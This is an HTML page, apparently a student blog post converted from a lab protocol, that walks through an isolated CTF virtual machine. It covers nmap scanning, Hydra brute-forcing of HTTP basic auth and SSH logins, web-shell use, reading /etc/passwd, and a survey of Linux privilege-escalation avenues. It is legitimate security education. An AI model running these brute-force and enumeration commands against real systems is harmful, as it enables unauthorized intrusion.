@@ -1,0 +1,694 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto">
+
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="noindex, nofollow">
+<title>Babys first CTF | </title>
+<meta name="keywords" content="linux, it sec, school, red team, ctf">
+<meta name="description" content="
+Note: this was converted from LaTeX to Markdown using ChatGPT 4.1. The original PDF can be found here along with the bibliography.
+
+Ethical hacking of a CTF-VM
+
+Laboratory protocol
+Exercise 7: Ethical hacking of a CTF-VM
+
+     
+            Figure: Grouplogo
+        
+
+
+Subject: ITSI
+Class: 3AHITN
+Name: Stefan Fürst, Justin Tremurici
+Group Name/Number: todo/12
+Supervisor: SPAC, ZIVK
+Exercise dates: 17-19.1.2025
+Submission date: 20.1.2025
+
+Table of Contents
+
+Task definition
+Summary
+Complete network topology of the exercise
+Exercise Execution
+References
+
+
+Task definition
+This task is based on a Capture the Flag (CTF) challenge, where multiple flags are hidden across an environment and can be found either through exploits or by navigating the system. Two virtual machines are provided: an Ubuntu server, which hosts the flags, and a Kali Linux machine for offensive actions. Both machines operate in a Host-only network, meaning they can communicate with each other but not with the external internet or other devices.">
+<meta name="author" content="">
+<link rel="canonical" href="http://localhost:1313/posts/itsi/year-3/exercise-7/babys-first-ctf/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.f49d66caae9ea0fd43f21f29e71a8d3e284517ed770f2aa86fa012953ad3c9ef.css" integrity="sha256-9J1myq6eoP1D8h8p5xqNPihFF&#43;13Dyqob6ASlTrTye8=" rel="preload stylesheet" as="style">
+<link rel="icon" href="http://localhost:1313/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/favicon-32x32.png">
+<link rel="apple-touch-icon" href="http://localhost:1313/apple-touch-icon.png">
+<link rel="mask-icon" href="http://localhost:1313/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="http://localhost:1313/posts/itsi/year-3/exercise-7/babys-first-ctf/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-track {
+                background: 0 0;
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-thumb {
+                border-color: var(--theme);
+            }
+        }
+
+    </style>
+</noscript>
+</head>
+
+<body class="" id="top">
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.body.classList.add('dark');
+    } else if (localStorage.getItem("pref-theme") === "light") {
+        document.body.classList.remove('dark')
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.body.classList.add('dark');
+    }
+
+</script>
+
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="http://localhost:1313/about/" title="About">
+                    <span>About</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/posts/" title="Posts">
+                    <span>Posts</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/" title="root">
+                    <span>root</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    
+    <h1 class="post-title entry-hint-parent">
+      Babys first CTF
+    </h1>
+    <div class="post-meta"><span title='2025-04-11 03:33:09 +0200 CEST'>April 11, 2025</span>
+
+</div>
+  </header> 
+  <div class="post-content"><blockquote>
+<p>Note: this was converted from LaTeX to Markdown using ChatGPT 4.1. The original PDF can be found <a href="https://github.com/Stefanistkuhl/goobering/blob/master/itsi/y3/ex7/UE7_CTF.pdf">here</a> along with the <a href="https://github.com/Stefanistkuhl/goobering/blob/master/itsi/y3/ex7/quellen.bib">bibliography</a>.</p></blockquote>
+<hr>
+<h1 id="ethical-hacking-of-a-ctf-vm">Ethical hacking of a CTF-VM<a hidden class="anchor" aria-hidden="true" href="#ethical-hacking-of-a-ctf-vm">#</a></h1>
+<hr>
+<p><strong>Laboratory protocol</strong><br>
+Exercise 7: Ethical hacking of a CTF-VM<br>
+<figure>
+    <img loading="lazy" src="/itsi/y3/ex7/images/menheraMagnifier.png"/> <figcaption>
+            Figure: Grouplogo
+        </figcaption>
+</figure>
+
+<strong>Subject:</strong> ITSI<br>
+<strong>Class:</strong> 3AHITN<br>
+<strong>Name:</strong> Stefan Fürst, Justin Tremurici<br>
+<strong>Group Name/Number:</strong> todo/12<br>
+<strong>Supervisor:</strong> SPAC, ZIVK<br>
+<strong>Exercise dates:</strong> 17-19.1.2025<br>
+<strong>Submission date:</strong> 20.1.2025</p>
+<hr>
+<h2 id="table-of-contents">Table of Contents<a hidden class="anchor" aria-hidden="true" href="#table-of-contents">#</a></h2>
+<ul>
+<li><a href="#task-definition">Task definition</a></li>
+<li><a href="#summary">Summary</a></li>
+<li><a href="#complete-network-topology-of-the-exercise">Complete network topology of the exercise</a></li>
+<li><a href="#exercise-execution">Exercise Execution</a></li>
+<li><a href="#references">References</a></li>
+</ul>
+<hr>
+<h2 id="task-definition">Task definition<a hidden class="anchor" aria-hidden="true" href="#task-definition">#</a></h2>
+<p>This task is based on a Capture the Flag (CTF) challenge, where multiple flags are hidden across an environment and can be found either through exploits or by navigating the system. Two virtual machines are provided: an Ubuntu server, which hosts the flags, and a Kali Linux machine for offensive actions. Both machines operate in a <code>Host-only network</code>, meaning they can communicate with each other but not with the external internet or other devices.</p>
+<p>The goal is to use the tools and techniques available in Kali Linux to explore the Ubuntu server, identify vulnerabilities, and capture the flags, all within an isolated network environment.</p>
+<hr>
+<h2 id="summary">Summary<a hidden class="anchor" aria-hidden="true" href="#summary">#</a></h2>
+<p>In this exercise, we had to break into a Linux server VM and find six hidden flags. To gain access, we first scanned the network with <code>nmap</code> and discovered four web servers. One of these required brute-forcing to retrieve the first flag, which then allowed us to gain a web shell to the system. Using the web shell, we brute-forced the password for the current user to SSH into the machine. Once logged in, we explored the system to find flags.</p>
+<p>We discovered a flag in the comments of the server&rsquo;s <code>python</code> file, which we found by inspecting the running processes. The file was intended to run as a process, and this led us to locate it. Additionally, we found flags in the history of another user who had permission to view <code>secret_flag.txt</code> in the <code>/opt</code> directory, as well as one flag in the <code>/tmp</code> directory. There are actually seven flags in total, with one located in the home directory of <code>/root</code>.</p>
+<p>We attempted to gain root access using the Linux Smart Enumeration tool and by analyzing the results for potential privilege escalation vectors, such as SUID binaries or binaries we could run with <code>sudo</code> to escalate to a shell. We also tried using a getshell from meterpreter to gain access, but none of these methods worked. As a result, we edited the boot configurations in the VM itself to get a shell and then changed the root password. This allowed us to execute the CTF setup script and view the final flag in the root&rsquo;s home directory.<!-- raw HTML omitted -->ChatGPT<sup id="fnref:1"><a href="#fn:1" class="footnote-ref" role="doc-noteref">1</a></sup><!-- raw HTML omitted --></p>
+<hr>
+<h2 id="complete-network-topology-of-the-exercise">Complete network topology of the exercise<a hidden class="anchor" aria-hidden="true" href="#complete-network-topology-of-the-exercise">#</a></h2>
+<figure>
+    <img loading="lazy" src="/itsi/y3/ex7/images/topo.png"/> <figcaption>
+            Figure 1: Complete network topology of the exercise
+        </figcaption>
+</figure>
+
+<hr>
+<h2 id="exercise-execution">Exercise Execution<a hidden class="anchor" aria-hidden="true" href="#exercise-execution">#</a></h2>
+<h3 id="setting-up-the-virtual-machines">Setting up the virtual machines<a hidden class="anchor" aria-hidden="true" href="#setting-up-the-virtual-machines">#</a></h3>
+<p>To get started with this CTF, make sure that VirtualBox version 7.1.4 is used. The VM to attack must be imported by double-clicking the provided <code>.ova</code> file. After the import is complete, the network settings must be changed to use Host-only Adapter mode. Since using the default Host-only network did not work, we had to create a new Host-only network. To do this, either press <code>&lt;C-h&gt;</code> or click on <code>File &gt; Tools &gt; Network Manager</code>, as shown in Figure 2.</p>
+<figure>
+    <img loading="lazy" src="/itsi/y3/ex7/images/openingNetworkManager.png"/> <figcaption>
+            Figure 2: Opening VirtualBox Network Manager settings
+        </figcaption>
+</figure>
+
+<p>In this menu, click on <code>Create</code>, then check the <code>Enable Server</code> box to enable the DHCP server so the target VM will receive an IP address. Then, click on <code>Adapter</code> to view the IP range of the network, which in our case is <code>192.168.15.0/24</code>, which can be seen in Figure 3.</p>
+<figure>
+    <img loading="lazy" src="/itsi/y3/ex7/images/nwipsfr.png"/> <figcaption>
+            Figure 3: Showing the IP settings for the new Host-only network
+        </figcaption>
+</figure>
+
+<p>Next, open the virtual machine settings by selecting the VM in the list and pressing <code>&lt;C-s&gt;</code>. Under the <code>Network</code> section, change the network adapter to use the Host-only Adapter and select the VirtualBox Host-only Ethernet Adapter #2, which was just created. Perform this step for both the target VM and the Kali VM, as detailed in Figure 4.</p>
+<figure>
+    <img loading="lazy" src="/itsi/y3/ex7/images/vmnwconf.png"/> <figcaption>
+            Figure 4: Showing the network configuration of the virtual machines
+        </figcaption>
+</figure>
+
+<hr>
+<h3 id="reconnaissance-scanning-the-network">Reconnaissance: Scanning the Network<a hidden class="anchor" aria-hidden="true" href="#reconnaissance-scanning-the-network">#</a></h3>
+<p>We use the Cyber Kill Chain to structure our steps for completing the CTF, with any attack beginning with reconnaissance, which in this case means scanning the network with <code>nmap</code>.<!-- raw HTML omitted -->Lockheed Martin<sup id="fnref:2"><a href="#fn:2" class="footnote-ref" role="doc-noteref">2</a></sup><!-- raw HTML omitted --> Since we don&rsquo;t know the IP address of the target server yet, we need to scan the network to find it. For this, the command <code>nmap 192.168.15.0/24</code> is used to scan the entire network for open ports, as illustrated in Figure 5.</p>
+<figure>
+    <img loading="lazy" src="/itsi/y3/ex7/images/firstnmapscan.png"/> <figcaption>
+            Figure 5: Results of the nmap scan
+        </figcaption>
+</figure>
+
+<p>We can determine that the target has the IP address <code>192.168.15.3</code>, since <code>.1</code> is the network address, <code>.2</code> is the DHCP server, and <code>.4</code> is the IP address of the Kali VM. This can be verified by running <code>ip a</code> or by scanning the open ports, since <code>ssh</code> is not exposed.</p>
+<p>Now we can run another <code>nmap</code> scan to get further information about the running services and their version by using the <code>-sV</code> flag and the <code>-T4</code> flag for aggressive timing, and the <code>-p-</code> value to scan all ports.<!-- raw HTML omitted -->Nmap Version Detection<sup id="fnref:3"><a href="#fn:3" class="footnote-ref" role="doc-noteref">3</a></sup><!-- raw HTML omitted --><!-- raw HTML omitted -->Nmap Timing<sup id="fnref:4"><a href="#fn:4" class="footnote-ref" role="doc-noteref">4</a></sup><!-- raw HTML omitted --> The results of the scan can be seen in Figure 6.</p>
+<figure>
+    <img loading="lazy" src="/itsi/y3/ex7/images/nmapfr.png"/> <figcaption>
+            Figure 6: Results of the detailed nmap scan
+        </figcaption>
+</figure>
+
+<p>From this scan, we can see that <code>ssh</code> and four <code>http</code> servers running Python 3.12.3 are active on the system.</p>
+<hr>
+<h3 id="reconnaissance-exploring-the-websites">Reconnaissance: Exploring the websites<a hidden class="anchor" aria-hidden="true" href="#reconnaissance-exploring-the-websites">#</a></h3>
+<p>If we open the websites in our web browser of choice, we can see that the one on port <code>1080</code> says that to get further, we need to scan deeper, which we already did. The website on port <code>5155</code> shows text from foreign languages, which is randomized and always prints out different text on refresh. The site on port <code>10458</code> prints out a message in <code>base64</code>, and lastly, the one on port <code>10448</code> has a basic authentication login prompt for a mini web shell. Figure 7 shows the content of each webpage.</p>
+<figure>
+    <img loading="lazy" src="/itsi/y3/ex7/images/allesiten.png"/> <figcaption>
+            Figure 7: Showing the contents of each page using curl
+        </figcaption>
+</figure>
+
+<p>The <code>base64</code> message can be decoded by piping the string, using <code>echo</code>, into the <code>base64</code> command, which gives us the hint to use port <code>55487</code>, the site with authentication. This is shown in Figure 8.</p>
+<figure>
+    <img loading="lazy" src="/itsi/y3/ex7/images/base64.png"/> <figcaption>
+            Figure 8: Decoding the base64 message
+        </figcaption>
+</figure>
+
+<p>To get all the random variants from the site with the foreign languages, I wrote a quick batch script to recursively relay the website and save the output in a file called <code>output</code>, as shown in Figure 9.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e">#!/bin/bash
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">while</span> true;<span style="color:#66d9ef">do</span>
+</span></span><span style="display:flex;"><span>    body<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>curl -s 192.168.15:5155<span style="color:#66d9ef">)</span>
+</span></span><span style="display:flex;"><span>    echo <span style="color:#e6db74">&#34;</span>$body<span style="color:#e6db74">&#34;</span> &gt;&gt; output
+</span></span><span style="display:flex;"><span>    echo <span style="color:#e6db74">&#34;</span>$body<span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">done</span>
+</span></span></code></pre></div><figure>
+    <img loading="lazy" src="/itsi/y3/ex7/images/gettextsh.png"/> <figcaption>
+            Figure 9: Running the script
+        </figcaption>
+</figure>
+
+<p>After running it for a while, we prompted ChatGPT with the list of outputs to translate, which revealed the following hint, as shown in Figure 10.</p>
+<figure>
+    <img loading="lazy" src="/itsi/y3/ex7/images/labngs.png"/> <figcaption>
+            Figure 10: ChatGPT translating the hint
+        </figcaption>
+</figure>
+
+<hr>
+<h3 id="weaponization-evaluating-the-needed-tools">Weaponization: Evaluating the needed tools<a hidden class="anchor" aria-hidden="true" href="#weaponization-evaluating-the-needed-tools">#</a></h3>
+<p>Now that we know the username and that it uses HTTP Basic Authentication, we can use Hydra to brute-force the password. For this, I have chosen the 10-million-password list as our wordlist.<!-- raw HTML omitted -->pw-list<sup id="fnref:5"><a href="#fn:5" class="footnote-ref" role="doc-noteref">5</a></sup><!-- raw HTML omitted --></p>
+<hr>
+<h3 id="exploitation-using-hydra-to-break-http-basic-authentication">Exploitation: Using Hydra to break HTTP basic authentication<a hidden class="anchor" aria-hidden="true" href="#exploitation-using-hydra-to-break-http-basic-authentication">#</a></h3>
+<p>To brute force the password, the following <code>hydra</code> command will be used: <code>hydra -l user -P pw.txt -s 55487 -f 192.168.15.3 http-get /</code><!-- raw HTML omitted -->hydra-http-basic-auth<sup id="fnref:6"><a href="#fn:6" class="footnote-ref" role="doc-noteref">6</a></sup><!-- raw HTML omitted --></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>-l user <span style="color:#75715e">#specifying the username to attempt logging in with</span>
+</span></span><span style="display:flex;"><span>-P pw.txt <span style="color:#75715e">#tells Hydra to use the contents of pw.txt as passwords to try</span>
+</span></span><span style="display:flex;"><span>-s <span style="color:#ae81ff">55487</span> <span style="color:#75715e">#specifying the port to connect to</span>
+</span></span><span style="display:flex;"><span>-f <span style="color:#75715e">#telling Hydra to stop after a valid login</span>
+</span></span><span style="display:flex;"><span>192.168.15.3 <span style="color:#75715e">#setting the target IP address</span>
+</span></span><span style="display:flex;"><span>http-get / <span style="color:#75715e">#specifying the service and method to use</span>
+</span></span></code></pre></div><figure>
+    <img loading="lazy" src="/itsi/y3/ex7/images/hydra.png"/> <figcaption>
+            Figure 11: Running the Hydra command to get the credentials
+        </figcaption>
+</figure>
+
+<p>After entering the found credentials on the webpage, we get the first flag.</p>
+<figure>
+    <img loading="lazy" src="/itsi/y3/ex7/images/flag1.png"/> <figcaption>
+            Figure 12: First flag found
+        </figcaption>
+</figure>
+
+<hr>
+<p>Besides the flag, there is a webshell on the site, so we can run commands on the server. However, interacting through the website is a horrible experience, and that&rsquo;s why we used the command <code>whoami</code> to find out which user we are logged in as so we can SSH into the server instead.</p>
+<hr>
+<h3 id="exploitation-using-hydra-to-brute-force-ssh-login">Exploitation: Using Hydra to brute force SSH login<a hidden class="anchor" aria-hidden="true" href="#exploitation-using-hydra-to-brute-force-ssh-login">#</a></h3>
+<p>To brute force the SSH login, this Hydra command is used: <code>hydra -l GrumpyCat -P pw.txt 192.168.15.3 ssh -t 4</code>.<!-- raw HTML omitted -->hydra-ssh<sup id="fnref:7"><a href="#fn:7" class="footnote-ref" role="doc-noteref">7</a></sup><!-- raw HTML omitted --> The only changes made to the command are the username we got through the webshell, replacing the method with SSH, and using the <code>-t</code> flag with a value of 4 to set the max tasks to 4, since some SSH configurations tend to block higher counts. Figure 13 shows the command output.</p>
+<figure>
+    <img loading="lazy" src="/itsi/y3/ex7/images/hydrassh.png"/> <figcaption>
+            Figure 13: Getting the credentials for the user GrumpyCat
+        </figcaption>
+</figure>
+
+<hr>
+<h3 id="exploring-the-system">Exploring the system<a hidden class="anchor" aria-hidden="true" href="#exploring-the-system">#</a></h3>
+<h4 id="listing-all-the-files">Listing all the files<a hidden class="anchor" aria-hidden="true" href="#listing-all-the-files">#</a></h4>
+<p>Now that we have a shell in the server, it&rsquo;s time to dig around and explore. We started by running <code>ls -R / * 2&gt;/dev/null | grep flag</code>, in which the <code>-R</code> flag is used to recursively list all the files in the root of the file system and the <code>*</code> is used to list everything inside that as well. Lastly, the <code>2&gt;/dev/null</code> redirects <code>stderr</code> to the file <code>/dev/null</code> to effectively delete them from the output, which is piped into <code>grep</code> to filter it to search for files that have <code>flag</code> in their name.<!-- raw HTML omitted -->stderr<sup id="fnref:8"><a href="#fn:8" class="footnote-ref" role="doc-noteref">8</a></sup><!-- raw HTML omitted --> To tidy up the output, it can be piped into <code>grep</code> again with the <code>-v</code> flag to exclude results that contain <code>flags</code>. Figure 14 shows the results.</p>
+<figure>
+    <img loading="lazy" src="/itsi/y3/ex7/images/searchingfor%20falgfiles.png"/> <figcaption>
+            Figure 14: Output of the search command
+        </figcaption>
+</figure>
+
+<p>As we can see, we found a file called <code>secret_flag.txt</code> and <code>flag_process.sh</code>, for which we can search with the following command: <code>find -name &quot;filename&quot; / 2&gt;/dev/null</code>. Figure 15 displays the found file locations.</p>
+<figure>
+    <img loading="lazy" src="/itsi/y3/ex7/images/findfiles.png"/> <figcaption>
+            Figure 15: File locations of the 2 found files
+        </figcaption>
+</figure>
+
+<hr>
+<h4 id="investigating-the-listening-service">Investigating the listening service<a hidden class="anchor" aria-hidden="true" href="#investigating-the-listening-service">#</a></h4>
+<p>With <code>ss -tulnp</code>, we can examine all listening process services on the system for TCP and UDP, along with the processes they use, if we have permission to see that.</p>
+<figure>
+    <img loading="lazy" src="/itsi/y3/ex7/images/sstunlp.png"/> <figcaption>
+            Figure 16: Viewing the listening services
+        </figcaption>
+</figure>
+
+<hr>
+<h4 id="investigating-the-process-flag">Investigating the process flag<a hidden class="anchor" aria-hidden="true" href="#investigating-the-process-flag">#</a></h4>
+<p>Let&rsquo;s return to the file <code>flag_process.sh</code> to get this flag. Simply cat the file as shown in Figure 17.</p>
+<figure>
+    <img loading="lazy" src="/itsi/y3/ex7/images/processflag.png"/> <figcaption>
+            Figure 17: Viewing the check_running_processes flag
+        </figcaption>
+</figure>
+
+<hr>
+<h4 id="further-investigating-the-webserver">Further investigating the webserver<a hidden class="anchor" aria-hidden="true" href="#further-investigating-the-webserver">#</a></h4>
+<p>Luckily, as seen in Figure 16, it appears that the webserver has been started as the current user, which we can further inspect with <code>ps aux | grep python</code>. As shown in Figure 18, the process has been started by the root user as GrumpyCat.</p>
+<figure>
+    <img loading="lazy" src="/itsi/y3/ex7/images/psauxpy.png"/> <figcaption>
+            Figure 18: Inspecting the running Python processes
+        </figcaption>
+</figure>
+
+<p>If we read the file <code>/bin/ctf_server.py</code>, we first see that the ranges of the randomized port ranges are <code>4000-5600</code>, <code>10000-12000</code>, and <code>50000-60000</code>. The intended translation is &ldquo;Hinweis1: Der Nutzername lautet user&rdquo;, and lastly, a flag hides itself at the bottom of the file, which is shown in Figure 19.</p>
+<figure>
+    <img loading="lazy" src="/itsi/y3/ex7/images/commentflag.png"/> <figcaption>
+            Figure 19: Viewing the flag in the server Python file
+        </figcaption>
+</figure>
+
+<hr>
+<h4 id="investigating-secret_flagtxt">Investigating secret_flag.txt<a hidden class="anchor" aria-hidden="true" href="#investigating-secret_flagtxt">#</a></h4>
+<p>If we simply cat this file as the current user, we can&rsquo;t do that since we lack permission and are not in the sudoers group or file. Therefore, we have two options: either find a different user who has the privileges to read the file or escalate our current privileges to become root. The first option is the more reasonable one, which we will use.</p>
+<p>To see all the users we can log into, we can search through the file using the following grep command: <code>grep -v &quot;nologin&quot; /etc/passwd</code>. With this command, we display all the lines of the <code>/etc/passwd</code> file that don&rsquo;t contain <code>nologin</code> to only display the users we can log in as.</p>
+<figure>
+    <img loading="lazy" src="/itsi/y3/ex7/images/usr.png"/> <figcaption>
+            Figure 20: Listing the users we can log in as
+        </figcaption>
+</figure>
+
+<p>As seen in Figure 20, we got two new options as users to log in: <code>ubuntu</code> and <code>CheerfulOtter</code>. Since we had already tried brute-forcing the root password from the very start, just in case, and the user users have not set an interactive login shell, we chose <code>CheerfulOtter</code> because the name sounds more similar to <code>GrumpyCat</code>. We also brute-forced the <code>ubuntu</code> user in the background. This was a correct assumption, as the password for the <code>CheerfulOtter</code> user was also &ldquo;password&rdquo;, and we didn&rsquo;t find the password for the <code>ubuntu</code> user, which also had its sudo permissions removed in the <code>remove_ubuntu_from_sudo()</code> function in the setup script.</p>
+<figure>
+    <img loading="lazy" src="/itsi/y3/ex7/images/cheerfulotpw.png"/> <figcaption>
+            Figure 21: Getting the credentials for CheerfulOtter
+        </figcaption>
+</figure>
+
+<p>As seen in Figure 21, we got the credentials for the CheerfulOtter user. If we log in as that user and run <code>sudo -l</code> to see what permissions we have with sudo, we can see that the only command we can run elevated is <code>/bin/cat /opt/secret_flag.txt</code>, which we need in order to find the flag, as shown in Figure 22.</p>
+<figure>
+    <img loading="lazy" src="/itsi/y3/ex7/images/sh.png"/> <figcaption>
+            Figure 22: Viewing secret_flag.txt
+        </figcaption>
+</figure>
+
+<hr>
+<h4 id="exploring-the-new-user">Exploring the new user<a hidden class="anchor" aria-hidden="true" href="#exploring-the-new-user">#</a></h4>
+<p>Since we are in a new user, it&rsquo;s time to rerun old commands and see if any new files can be found. Instead of using <code>ls</code> and <code>grep</code> to search, we will use the following <code>find</code> command: <code>find / -type f -name '*flag*' 2&gt;/dev/null</code>.<!-- raw HTML omitted -->find<sup id="fnref:9"><a href="#fn:9" class="footnote-ref" role="doc-noteref">9</a></sup><!-- raw HTML omitted --> Here is a breakdown of the command used in Figure 23:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>find / <span style="color:#75715e">#Selecting the / directory to search in</span>
+</span></span><span style="display:flex;"><span>-type f <span style="color:#75715e">#Restricts the command to only search files</span>
+</span></span><span style="display:flex;"><span>-name <span style="color:#e6db74">&#39;*flag*&#39;</span> <span style="color:#75715e">#Specifies that the command should only search files that contain &#34;flag&#34;</span>
+</span></span><span style="display:flex;"><span>2&gt;/dev/null <span style="color:#75715e">#Hiding errors</span>
+</span></span></code></pre></div><p><figure>
+    <img loading="lazy" src="/itsi/y3/ex7/images/fdtmp.png"/> <figcaption>
+            Figure 23: Output of the find command
+        </figcaption>
+</figure>
+
+<figure>
+    <img loading="lazy" src="/itsi/y3/ex7/images/tmpfl.png"/> <figcaption>
+            Figure 24: Viewing the flag in the /tmp directory
+        </figcaption>
+</figure>
+</p>
+<hr>
+<h4 id="finding-the-history-flag">Finding the history flag<a hidden class="anchor" aria-hidden="true" href="#finding-the-history-flag">#</a></h4>
+<p>Additionally to the find command, I remembered reading in a CTF cheat sheet a while ago to check the command history of the user. However, I initially only checked <code>.bash_history</code> instead of the <code>.history</code> file, which contains a flag in this CTF.<!-- raw HTML omitted -->enumeration-walkthough<sup id="fnref:10"><a href="#fn:10" class="footnote-ref" role="doc-noteref">10</a></sup><!-- raw HTML omitted --> I always missed it until I ran <code>ls -l</code> as a sanity check in the home directory of CheerfulOtter and found the flag, as shown in Figures 25 and 26.</p>
+<p><figure>
+    <img loading="lazy" src="/itsi/y3/ex7/images/colsal.png"/> <figcaption>
+            Figure 25: Viewing the home directories of CheerfulOtter
+        </figcaption>
+</figure>
+
+<figure>
+    <img loading="lazy" src="/itsi/y3/ex7/images/cofl.png"/> <figcaption>
+            Figure 26: Viewing the flag in the .history file
+        </figcaption>
+</figure>
+</p>
+<hr>
+<h3 id="it-should-be-over-now-right">It should be over now, right?<a hidden class="anchor" aria-hidden="true" href="#it-should-be-over-now-right">#</a></h3>
+<p>Now that we found the following six flags:</p>
+<ol>
+<li><code>FLAG{use_secure_credentials}</code></li>
+<li><code>FLAG{always_check_comments_in_scripts}</code></li>
+<li><code>FLAG{sudo_privileges_are_key}</code></li>
+<li><code>FLAG{inspect_running_processes}</code></li>
+<li><code>FLAG{tmp_directory_is_not_safe}</code></li>
+<li><code>FLAG{always_check_history}</code></li>
+</ol>
+<p>This means that the exercise is over, right?</p>
+<p>No, it&rsquo;s not over yet. In an email, Professor Zivkovic stated that for flag 6, root access is needed. This means that either he made a mistake in counting, forgot about one, or there is a 7th flag that requires root privileges. Spoiler alert: it was the latter. So, the next section will be about escalating the privileges to get to that point.</p>
+<hr>
+<h3 id="privilege-escalation-on-linux">Privilege escalation on Linux<a hidden class="anchor" aria-hidden="true" href="#privilege-escalation-on-linux">#</a></h3>
+<p>If you want to escalate your privileges on Linux, you have five options, which are the following:<!-- raw HTML omitted -->priv-esc-overview<sup id="fnref:11"><a href="#fn:11" class="footnote-ref" role="doc-noteref">11</a></sup><!-- raw HTML omitted --></p>
+<ol>
+<li>Find an exploit for the version of the kernel that is running.<!-- raw HTML omitted -->kernel-exploit<sup id="fnref:12"><a href="#fn:12" class="footnote-ref" role="doc-noteref">12</a></sup><!-- raw HTML omitted --></li>
+<li>Find a SUID binary that runs with the owner&rsquo;s permissions.<!-- raw HTML omitted -->suid<sup id="fnref:13"><a href="#fn:13" class="footnote-ref" role="doc-noteref">13</a></sup><!-- raw HTML omitted --></li>
+<li>Escalate to a shell in a usable command with <code>sudo</code>.<!-- raw HTML omitted -->sudo-exploit<sup id="fnref:14"><a href="#fn:14" class="footnote-ref" role="doc-noteref">14</a></sup><!-- raw HTML omitted --></li>
+<li>Find writable files that run at startup, like <code>crontab</code>, or other misconfigurations in the system.<!-- raw HTML omitted -->enumeration-walkthough<sup id="fnref1:10"><a href="#fn:10" class="footnote-ref" role="doc-noteref">10</a></sup><!-- raw HTML omitted --></li>
+<li>Find an attachable process that is running as root.</li>
+</ol>
+<h4 id="using-a-smart-enumeration-tool">Using a smart enumeration tool<a hidden class="anchor" aria-hidden="true" href="#using-a-smart-enumeration-tool">#</a></h4>
+<p>To quickly and effortlessly gather information about possible attack vectors for privilege escalation, there are tools such as <code>linux-smart-enumeration</code> to do the job for you.<!-- raw HTML omitted -->lse<sup id="fnref:15"><a href="#fn:15" class="footnote-ref" role="doc-noteref">15</a></sup><!-- raw HTML omitted --> After running the script on both users, we found that there were no attack vectors we could exploit. We discovered an empty backup file in the following location: <code>/snap/docker/2963/usr/share/man/man8/zstreamdump.8.gz</code>, and a <code>screen</code> session by the root user which we could not attach to. Additionally, the binaries <code>/snap/snapd/23545/usr/lib/snapd/snap-confine</code> and <code>/snap/snapd/23258/usr/lib/snapd/snap-confine</code> run as root, but the only available exploit for them has been patched for years. Furthermore, the only command we could run with elevated privileges is <code>cat /opt/secret_flag.txt</code>, which does not allow us to escalate to the command line interface (CLI). Lastly, not a single cron file was writable, nor were we able to view configuration files such as <code>/etc/sudoers</code>, which means there is no way to get root privileges on the system.</p>
